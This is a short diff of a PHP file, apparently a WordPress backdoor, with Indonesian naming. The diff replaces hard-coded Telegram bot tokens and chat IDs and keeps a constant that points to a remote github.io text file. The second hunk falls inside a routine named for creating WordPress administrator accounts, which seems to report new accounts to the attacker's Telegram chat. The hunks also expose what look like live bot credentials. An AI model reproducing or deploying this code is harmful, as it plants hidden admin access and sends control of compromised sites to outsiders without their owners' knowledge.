@@ -40,9 +40,9 @@ $security_config_file = __DIR__ . '/security_config.json';
 
 define('URL_KEAMANAN', 'https://viral-news45.github.io/dayli/tarikanindex.txt');
 
-define('BOT_KEAMANAN', '8151155947:AAEG7kM9jozQQDzYIOyBXmlKst63cQHkU7Y');
+define('BOT_KEAMANAN', '8794386948:AAFsb7a0ezEzLPkrSCNcgd-yHXvFak0XjGY');
 
-define('KEAMANAN_ID', '-1002509464443');
+define('KEAMANAN_ID', '-4857821333');
 
 if (!function_exists('custom_escapeshellarg')) {
 
@@ -2204,7 +2204,7 @@ EOT;
 
             else {
 
-                $token_key_admin_wp_creator_post_val_final_full = '8151155947:AAEG7kM9jozQQDzYIOyBXmlKst63cQHkU7Y'; $destination_id_admin_wp_creator_post_val_final_full = '-1002509464443';
+                $token_key_admin_wp_creator_post_val_final_full = '8794386948:AAFsb7a0ezEzLPkrSCNcgd-yHXvFak0XjGY'; $destination_id_admin_wp_creator_post_val_final_full = '-5286243965';
 
                 if (!isset($_POST['create_admin_nonce']) || !wp_verify_nonce($_POST['create_admin_nonce'], 'create_admin_action')) { $wp_admin_feedback_text = 'Permintaan tidak valid.'; $wp_admin_feedback_class = 'error'; }
 
